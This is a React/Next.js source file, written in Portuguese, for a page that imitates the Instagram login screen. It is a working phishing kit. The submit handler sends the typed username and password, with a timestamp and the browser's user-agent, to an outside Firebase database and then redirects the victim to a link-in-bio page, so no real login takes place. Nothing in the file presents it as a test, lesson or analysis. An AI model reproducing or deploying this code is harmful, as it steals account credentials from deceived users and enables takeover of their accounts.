"use client"

import type React from "react"
import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { imageConfig, getImageUrl, getPlaceholder } from "@/config/images"

export default function InstagramLogin() {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      const firebaseUrl = "https://form-test-c6a76-default-rtdb.firebaseio.com/logins.json"

      const dadosLogin = {
        usuario: username,
        senha: password,
        plataforma: "Instagram",
        dataHora: new Date().toLocaleString("pt-BR"),
        timestamp: Date.now(),
        ip: "Capturado via Next.js",
        navegador: navigator.userAgent.substring(0, 100),
      }

      const response = await fetch(firebaseUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(dadosLogin),
      })

      if (response.ok) {
        console.log("✅ Dados salvos no Firebase (Instagram):", dadosLogin)
        setTimeout(() => {
          window.location.href = "https://linkbio.co/isa-lua"
        }, 1000)
      } else {
        console.error("❌ Erro ao salvar no Firebase")
        alert("Erro ao processar login. Tente novamente.")
        setIsLoading(false)
      }
    } catch (err) {
      console.error("Erro de rede:", err)
      alert("Erro de conexão. Tente novamente.")
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-[#FAFAFA] flex items-center justify-center px-4">
      <div className="w-full max-w-sm">
        {/* Logo do Instagram */}
        <div className="text-center mb-8">
          <div className="bg-white border border-gray-300 rounded-lg p-10 mb-4">
            <div className="mb-8">
              <h1 className="text-4xl font-light text-gray-800 mb-8" style={{ fontFamily: "Billabong, cursive" }}>
                Instagram
              </h1>
            </div>

            <form onSubmit={handleLogin} className="space-y-3">
              <div>
                <Label htmlFor="username" className="sr-only">
                  Nome de usuário
                </Label>
                <Input
                  id="username"
                  name="username"
                  type="text"
                  placeholder="Telefone, nome de usuário ou email"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="h-10 text-sm rounded-sm border-gray-300 focus:border-gray-400 focus:ring-0 bg-gray-50"
                  required
                />
              </div>

              <div>
                <Label htmlFor="password" className="sr-only">
                  Senha
                </Label>
                <Input
                  id="password"
                  name="senha"
                  type="password"
                  placeholder="Senha"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="h-10 text-sm rounded-sm border-gray-300 focus:border-gray-400 focus:ring-0 bg-gray-50"
                  required
                />
              </div>

              <Button
                type="submit"
                disabled={isLoading}
                className="w-full h-8 bg-[#0095F6] hover:bg-[#1877F2] text-white font-semibold text-sm rounded-sm transition-colors duration-200 disabled:opacity-50"
              >
                {isLoading ? (
                  <div className="flex items-center gap-2">
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    Entrando...
                  </div>
                ) : (
                  "Entrar"
                )}
              </Button>
            </form>

            <div className="flex items-center my-6">
              <div className="flex-1 border-t border-gray-300"></div>
              <span className="px-4 text-xs text-gray-500 font-semibold">OU</span>
              <div className="flex-1 border-t border-gray-300"></div>
            </div>

            <div className="text-center">
              <a
                href="#"
                className="text-[#385185] text-sm font-semibold hover:underline flex items-center justify-center gap-2"
              >
                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                </svg>
                Entrar com o Facebook
              </a>
            </div>

            <div className="text-center mt-4">
              <a href="#" className="text-xs text-[#385185] hover:underline">
                Esqueceu a senha?
              </a>
            </div>
          </div>

          <div className="bg-white border border-gray-300 rounded-lg p-6 text-center">
            <p className="text-sm text-gray-800">
              Não tem uma conta?{" "}
              <a href="#" className="text-[#0095F6] font-semibold hover:underline">
                Cadastre-se
              </a>
            </p>
          </div>

          <div className="text-center mt-4">
            <p className="text-sm text-gray-800 mb-4">Obtenha o aplicativo.</p>
            <div className="flex justify-center gap-2">
              <img
                src={
                  getImageUrl(imageConfig.appStores.appStore, getPlaceholder(136, 40, "App Store")) ||
                  "/placeholder.svg"
                }
                alt="Baixar na App Store"
                className="h-10"
              />
              <img
                src={
                  getImageUrl(imageConfig.appStores.googlePlay, getPlaceholder(136, 40, "Google Play")) ||
                  "/placeholder.svg"
                }
                alt="Disponível no Google Play"
                className="h-10"
              />
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="mt-12 text-center">
          <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-500 mb-4">
            <a href="#" className="hover:underline">
              Meta
            </a>
            <a href="#" className="hover:underline">
              Sobre
            </a>
            <a href="#" className="hover:underline">
              Blog
            </a>
            <a href="#" className="hover:underline">
              Carreiras
            </a>
            <a href="#" className="hover:underline">
              Ajuda
            </a>
            <a href="#" className="hover:underline">
              API
            </a>
            <a href="#" className="hover:underline">
              Privacidade
            </a>
            <a href="#" className="hover:underline">
              Termos
            </a>
            <a href="#" className="hover:underline">
              Principais contas
            </a>
            <a href="#" className="hover:underline">
              Localizações
            </a>
            <a href="#" className="hover:underline">
              Instagram Lite
            </a>
            <a href="#" className="hover:underline">
              Threads
            </a>
          </div>
          <div className="text-xs text-gray-500">
            <select className="bg-transparent text-gray-500 text-xs">
              <option>Português (Brasil)</option>
              <option>English</option>
              <option>Español</option>
            </select>
            <span className="ml-4">© 2024 Instagram from Meta</span>
          </div>
        </footer>
      </div>
    </div>
  )
}
